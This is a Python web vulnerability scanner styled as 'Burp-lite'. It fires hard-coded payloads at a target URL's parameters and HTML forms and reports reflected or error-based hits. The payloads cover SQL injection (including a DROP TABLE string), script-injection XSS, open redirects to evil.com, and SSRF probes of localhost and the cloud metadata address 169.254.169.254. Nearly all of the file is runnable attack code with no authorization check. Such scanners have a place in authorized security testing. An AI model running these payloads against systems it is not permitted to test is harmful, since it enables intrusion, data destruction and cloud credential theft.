#!/usr/bin/env python3
"""Web vulnerability scanner: test for SQLi, XSS, open redirect, SSRF in URL params and forms."""
import argparse
import re
import sys
from html.parser import HTMLParser
from urllib.parse import urlencode, urlparse, parse_qs, urljoin

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

SQLI_PAYLOADS = ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "1; DROP TABLE--", "' UNION SELECT NULL--", "1' AND '1'='1"]
XSS_PAYLOADS = ["<script>alert(1)</script>", "\"><img src=x onerror=alert(1)>", "<svg/onload=alert(1)>", "'-alert(1)-'"]
REDIRECT_PAYLOADS = ["//evil.com", "https://evil.com", "/\\evil.com", "//evil%2ecom"]
SSRF_PAYLOADS = ["http://127.0.0.1", "http://169.254.169.254/latest/meta-data/", "http://[::1]", "http://0x7f000001"]
SQL_ERRORS = [
    r"SQL syntax.*MySQL", r"Warning.*mysql_", r"PostgreSQL.*ERROR", r"ORA-\d{5}",
    r"Microsoft.*ODBC", r"SQLITE_ERROR", r"Unclosed quotation mark", r"syntax error",
    r"pg_query\(\)", r"unterminated quoted string", r"quoted string not properly terminated",
]


class FormParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.forms = []
        self._cur = None

    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == "form":
            self._cur = {"action": a.get("action", ""), "method": a.get("method", "get").lower(), "inputs": []}
        elif tag == "input" and self._cur is not None:
            self._cur["inputs"].append({"name": a.get("name", ""), "type": a.get("type", "text"), "value": a.get("value", "")})
        elif tag == "textarea" and self._cur is not None:
            self._cur["inputs"].append({"name": a.get("name", ""), "type": "text", "value": ""})

    def handle_endtag(self, tag):
        if tag == "form" and self._cur is not None:
            self.forms.append(self._cur)
            self._cur = None


def check_sqli(session, url, params, timeout):
    findings = []
    for param in params:
        for payload in SQLI_PAYLOADS:
            test_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
            test_params[param] = payload
            try:
                resp = session.get(url, params=test_params, timeout=timeout, verify=False)
                for pattern in SQL_ERRORS:
                    if re.search(pattern, resp.text, re.I):
                        findings.append({"type": "SQLi", "severity": "HIGH", "param": param, "payload": payload,
                                         "evidence": re.search(pattern, resp.text, re.I).group()[:80], "status": resp.status_code})
                        break
            except Exception:
                continue
    return findings


def check_xss(session, url, params, timeout):
    findings = []
    for param in params:
        for payload in XSS_PAYLOADS:
            test_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
            test_params[param] = payload
            try:
                resp = session.get(url, params=test_params, timeout=timeout, verify=False)
                if payload in resp.text:
                    findings.append({"type": "XSS", "severity": "HIGH", "param": param, "payload": payload,
                                     "evidence": "Payload reflected unencoded", "status": resp.status_code})
            except Exception:
                continue
    return findings


def check_redirect(session, url, params, timeout):
    findings = []
    for param in params:
        for payload in REDIRECT_PAYLOADS:
            test_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
            test_params[param] = payload
            try:
                resp = session.get(url, params=test_params, timeout=timeout, verify=False, allow_redirects=False)
                location = resp.headers.get("Location", "")
                if resp.status_code in (301, 302, 303, 307, 308) and ("evil.com" in location or location.startswith("//")):
                    findings.append({"type": "Open Redirect", "severity": "MEDIUM", "param": param, "payload": payload,
                                     "evidence": f"Redirect to: {location[:80]}", "status": resp.status_code})
            except Exception:
                continue
    return findings


def check_ssrf(session, url, params, timeout):
    findings = []
    for param in params:
        for payload in SSRF_PAYLOADS:
            test_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
            test_params[param] = payload
            try:
                resp = session.get(url, params=test_params, timeout=timeout, verify=False)
                ssrf_indicators = ["ami-id", "instance-id", "local-hostname", "root:", "127.0.0.1", "localhost"]
                for ind in ssrf_indicators:
                    if ind in resp.text.lower():
                        findings.append({"type": "SSRF", "severity": "CRITICAL", "param": param, "payload": payload,
                                         "evidence": f"Response contains: {ind}", "status": resp.status_code})
                        break
            except Exception:
                continue
    return findings


def scan_forms(session, base_url, timeout):
    findings = []
    try:
        resp = session.get(base_url, timeout=timeout, verify=False)
    except Exception:
        return findings
    parser = FormParser()
    try:
        parser.feed(resp.text)
    except Exception:
        return findings
    for form in parser.forms:
        action = urljoin(base_url, form["action"]) if form["action"] else base_url
        for inp in form["inputs"]:
            if not inp["name"] or inp["type"] in ("submit", "button", "hidden"):
                continue
            for payload in SQLI_PAYLOADS[:2] + XSS_PAYLOADS[:2]:
                data = {i["name"]: i["value"] or "test" for i in form["inputs"] if i["name"]}
                data[inp["name"]] = payload
                try:
                    if form["method"] == "post":
                        r = session.post(action, data=data, timeout=timeout, verify=False)
                    else:
                        r = session.get(action, params=data, timeout=timeout, verify=False)
                    for pattern in SQL_ERRORS:
                        if re.search(pattern, r.text, re.I):
                            findings.append({"type": "SQLi (form)", "severity": "HIGH", "param": inp["name"],
                                             "payload": payload, "evidence": "SQL error in form response", "status": r.status_code})
                            break
                    if payload in r.text and "<" in payload:
                        findings.append({"type": "XSS (form)", "severity": "HIGH", "param": inp["name"],
                                         "payload": payload, "evidence": "Payload reflected in form", "status": r.status_code})
                except Exception:
                    continue
    return findings


def main():
    ap = argparse.ArgumentParser(description="Web vulnerability scanner (Burp-lite)")
    ap.add_argument("target", help="Target URL with params (e.g., http://example.com/page?id=1)")
    ap.add_argument("-t", "--timeout", type=int, default=10, help="Request timeout")
    ap.add_argument("--forms", action="store_true", help="Also scan HTML forms")
    ap.add_argument("--skip-sqli", action="store_true", help="Skip SQL injection tests")
    ap.add_argument("--skip-xss", action="store_true", help="Skip XSS tests")
    args = ap.parse_args()

    target = args.target if args.target.startswith("http") else f"https://{args.target}"
    parsed = urlparse(target)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    params = parse_qs(parsed.query, keep_blank_values=True)

    session = requests.Session()
    session.headers["User-Agent"] = "PhantomStrike/1.0 BurpLite"

    print(f"[*] Burp-Lite Web Vulnerability Scanner")
    print(f"[*] Target: {target}")
    print(f"[*] Parameters: {list(params.keys()) if params else 'none'}\n")

    all_findings = []
    if params:
        if not args.skip_sqli:
            print("[*] Testing SQL Injection...")
            all_findings.extend(check_sqli(session, base_url, params, args.timeout))
        if not args.skip_xss:
            print("[*] Testing XSS...")
            all_findings.extend(check_xss(session, base_url, params, args.timeout))
        print("[*] Testing Open Redirect...")
        all_findings.extend(check_redirect(session, base_url, params, args.timeout))
        print("[*] Testing SSRF...")
        all_findings.extend(check_ssrf(session, base_url, params, args.timeout))
    else:
        print("[!] No URL parameters found to test")

    if args.forms:
        print("[*] Scanning HTML forms...")
        all_findings.extend(scan_forms(session, target, args.timeout))

    print(f"\n{'='*60}")
    print(f"[*] SCAN RESULTS")
    print(f"{'='*60}\n")
    if all_findings:
        for i, f in enumerate(all_findings, 1):
            print(f"  [{f['severity']}] #{i} {f['type']}")
            print(f"    Parameter: {f['param']}")
            print(f"    Payload:   {f['payload']}")
            print(f"    Evidence:  {f['evidence']}")
            print(f"    Status:    {f['status']}\n")
    else:
        print("  [OK] No vulnerabilities detected\n")

    crit = sum(1 for f in all_findings if f["severity"] == "CRITICAL")
    high = sum(1 for f in all_findings if f["severity"] == "HIGH")
    med = sum(1 for f in all_findings if f["severity"] == "MEDIUM")
    print(f"[*] Total: {len(all_findings)} findings ({crit} CRITICAL, {high} HIGH, {med} MEDIUM)")


if __name__ == "__main__":
    main()
